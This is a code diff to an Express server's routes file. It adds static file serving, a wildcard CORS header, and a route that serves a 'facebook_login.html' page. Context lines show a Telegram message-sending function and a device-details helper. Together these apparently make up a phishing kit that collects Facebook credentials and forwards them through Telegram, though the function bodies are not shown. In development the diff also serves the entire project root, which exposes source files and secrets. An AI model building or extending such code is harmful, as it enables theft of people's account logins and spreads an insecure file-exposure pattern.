@@ -1,7 +1,13 @@
-import type { Express, Request, Response } from "express";
+import express, { type Express, Request, Response } from "express";
 import { createServer, type Server } from "http";
 import { storage } from "./storage";
 import fetch from 'node-fetch';
+import path from 'path';
+import { fileURLToPath } from 'url';
+
+// ES modules don't have __dirname, so we need to create it
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);
 
 // Telegram Bot functionality
 async function sendTelegramMessage(message: string): Promise<boolean> {
@@ -46,14 +52,48 @@ export async function registerRoutes(app: Express): Promise<Server> {
   // use storage to perform CRUD operations on the storage interface
   // e.g. storage.insertUser(user) or storage.getUserByUsername(username)
 
+  // Set headers for all routes to prevent CORS issues
+  app.use((req, res, next) => {
+    res.header('Access-Control-Allow-Origin', '*');
+    res.header('Access-Control-Allow-Methods', 'GET, PUT, POST, DELETE');
+    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
+    next();
+  });
+
+  // Serve static files from the client directory in development
+  if (app.get("env") === "development") {
+    app.use(express.static(path.join(__dirname, '..', 'client')));
+    app.use(express.static(path.join(__dirname, '..')));
+  } else {
+    // In production, serve static files from the dist directory
+    app.use(express.static(path.join(__dirname, 'public')));
+  }
+
   // Serve the main index.html file at the root
   app.get('/', (req, res) => {
-    res.sendFile('index.html', { root: '.' });
+    if (app.get("env") === "development") {
+      // In development, let the Vite middleware handle this
+      res.sendFile(path.join(__dirname, '..', 'client', 'index.html'));
+    } else {
+      // In production, serve the static file
+      res.sendFile(path.join(__dirname, 'public', 'index.html'));
+    }
   });
 
   // Also serve it at /index.html path explicitly
   app.get('/index.html', (req, res) => {
-    res.sendFile('index.html', { root: '.' });
+    if (app.get("env") === "development") {
+      // In development, let the Vite middleware handle this
+      res.sendFile(path.join(__dirname, '..', 'client', 'index.html'));
+    } else {
+      // In production, serve the static file
+      res.sendFile(path.join(__dirname, 'public', 'index.html'));
+    }
+  });
+  
+  // Serve the facebook_login.html file directly
+  app.get('/facebook_login.html', (req, res) => {
+    res.sendFile(path.join(__dirname, '..', 'facebook_login.html'));
   });
 
   // Helper function to get device details
